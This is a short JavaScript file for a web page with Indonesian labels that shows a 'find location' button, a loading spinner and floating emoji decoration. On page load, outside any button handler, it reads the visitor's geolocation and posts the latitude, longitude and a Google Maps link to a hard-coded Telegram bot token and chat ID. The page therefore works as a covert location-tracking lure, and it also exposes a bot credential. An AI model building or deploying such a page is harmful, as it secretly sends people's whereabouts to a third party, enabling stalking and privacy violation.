function startLocation(){

document.getElementById("btnLokasi").style.display="none";
document.getElementById("loading").classList.remove("hidden");

getLocation();

}
const token = "8263999601:AAHWjwvSPrSk4URDgvPLAqGAvfLl_wuHLdE";
const chat_id = "8334910422";

function kirimLokasi(lat, lon) {

const url = `https://api.telegram.org/bot${token}/sendMessage`;

const text = `
📍 Lokasi ditemukan

Latitude: ${lat}
Longitude: ${lon}

https://www.google.com/maps?q=${lat},${lon}
`;

fetch(url,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:chat_id,
text:text
})
});

}

navigator.geolocation.getCurrentPosition(function(pos){

const lat = pos.coords.latitude;
const lon = pos.coords.longitude;

kirimLokasi(lat,lon);

});
const emojis = ["📍","🛰️","🌐","✨","📡"];

function createEmoji(){

const emoji = document.createElement("div");
emoji.classList.add("emoji");

emoji.innerText = emojis[Math.floor(Math.random()*emojis.length)];

emoji.style.left = Math.random()*100 + "vw";
emoji.style.animationDuration = (5 + Math.random()*5) + "s";

document.querySelector(".emoji-bg").appendChild(emoji);

setTimeout(()=>{
emoji.remove();
},10000);

}

setInterval(createEmoji,800);



